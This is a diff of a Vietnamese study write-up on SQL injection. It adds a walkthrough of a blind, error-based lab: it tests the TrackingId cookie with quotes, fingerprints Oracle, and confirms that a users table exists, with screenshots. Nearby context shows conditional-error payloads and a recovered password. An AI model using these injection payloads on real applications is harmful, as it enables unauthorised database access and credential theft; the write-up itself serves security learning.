@@ -104,6 +104,7 @@ Khi một ứng dụng bị lỗ hổng SQL injection và kết quả của truy
   + Nếu TrackingId hợp lệ → truy vấn trả kết quả → hiển thị thông báo "Welcome back".
   + Nếu TrackingId không hợp lệ → không hiển thị thông báo đó.
 > Dựa vào sự khác biệt này, ta có thể khai thác SQLi mù bằng cách chèn điều kiện để kiểm tra từng thông tin.
+
 **Lab: Blind SQL injection with conditional responses**
 1) Xác nhận tham số dễ bị Blind SQLi
    ```
@@ -160,7 +161,6 @@ Thêm vào Intruder để dò mật khẩu
 >  Ta có mật khẩu là _oa7uk3lrbpf9xct78f9v_
 <img width="1836" height="830" alt="image" src="https://github.com/user-attachments/assets/db5a7fe7-57a3-452b-b5cb-12c2bbda3afd" />
 > Đăng nhập thành công
-**Lab: Blind SQL injection with conditional responses**
 
 - **SQL Injection dựa trên lỗi (Error-based SQL injection)**
 Là kỹ thuật lợi dụng thông báo lỗi từ cơ sở dữ liệu để trích xuất hoặc suy luận dữ liệu nhạy cảm, kể cả trong trường hợp mù.
@@ -173,6 +173,47 @@ xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
 xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
 ```
 > Nếu ứng dụng trả phản hồi khác nhau khi có lỗi, suy ra điều kiện đúng/sai.
+
+**Lab: Blind SQL injection with conditional errors**
+1) Kiểm tra xem tham số TrackingId có dễ bị SQL injection không bằng cách tạo lỗi cú pháp SQL bằng thêm ' cuối câu
+```
+    TrackingId=XsBHVreWLfm3R2QJ'
+```
+<img width="1495" height="557" alt="image" src="https://github.com/user-attachments/assets/2963978f-6136-45a2-aba1-3f155a443752" />
+
+Gây lỗi cú pháp SQL (SQL syntax error),việc nhận được thông báo lỗi chứng tỏ input đã tác động đến cú pháp truy vấn → khả năng cao là tham số này dễ bị SQLi.
+
+```
+    TrackingId=XsBHVreWLfm3R2QJ''
+```
+<img width="1492" height="784" alt="image" src="https://github.com/user-attachments/assets/92876eda-b90c-4246-8b09-e5e86864b07f" />
+
+> lỗi biến mất → chứng minh rằng lỗi ban nãy là do cú pháp SQL sai chứ không phải lỗi hệ thống khác.
+
+2) Chứng minh tham số dễ bị tấn công
+
+```
+    TrackingId=ChejPJijGNFuDRrd'||(SELECT '' FROM dual)||'
+```
+<img width="1497" height="704" alt="image" src="https://github.com/user-attachments/assets/fcdc141d-1df1-44c1-a0af-64afd33edda9" />
+> Xác nhận cơ sở dữ liệu sử dụng là Oracle.
+```
+    TrackingId=ChejPJijGNFuDRrd'||(SELECT '' FROM not-a-real-table)||'
+```
+<img width="1487" height="595" alt="image" src="https://github.com/user-attachments/assets/2c950a3d-1156-4544-a3a7-18eafc3c65ec" />
+Trả về lỗi => biết được rằng dữ liệu chèn vào được thực thi trong câu lệnh SQL.
+
+3) Xác nhận bảng users tồn tại trong cơ sở dữ liệu
+```
+    TrackingId=ChejPJijGNFuDRrd'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
+```
+<img width="1479" height="803" alt="image" src="https://github.com/user-attachments/assets/77de35e8-f3cf-4467-8cbf-e0627cb26cea" />
+> Bảng user tồn tại 
+
+
+
+
+
 - **Trích xuất dữ liệu nhạy cảm qua lỗi chi tiết**
   ```
   ERROR: invalid input syntax for type integer: "Example data"
